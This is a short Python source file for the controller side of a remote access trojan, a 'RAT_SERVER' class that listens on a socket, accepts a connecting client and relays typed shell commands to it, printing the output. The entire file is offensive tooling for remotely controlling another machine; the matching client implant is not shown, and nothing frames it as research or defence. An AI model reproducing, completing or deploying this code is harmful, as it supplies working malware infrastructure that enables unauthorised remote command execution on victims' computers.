import socket, os

class RAT_SERVER:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def build_connection(self):
        global client, addr, s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(5)
        print("[*] Waiting for the client...")
        client, addr = s.accept()
        print()
        ipcli = client.recv(1024).decode()
        print(f"[*] Connection is established successfully with {ipcli}")
        print()

    def banner(self):
        print("banner")
    def execute(self):
        self.banner()
        while True:
            global command
            command = input('Command >>  ')

            if command == 'shell':
                client.send(command.encode())
                while 1:
                    command = str(input('>> '))
                    client.send(command.encode())
                    if command.lower() == 'exit':
                        break
                    result_output = client.recv(1024).decode()
                    print(result_output)
                client.close()
                s.close()







rat_server = RAT_SERVER("127.0.0.1", 12345)

rat_server.build_connection()

rat_server.execute()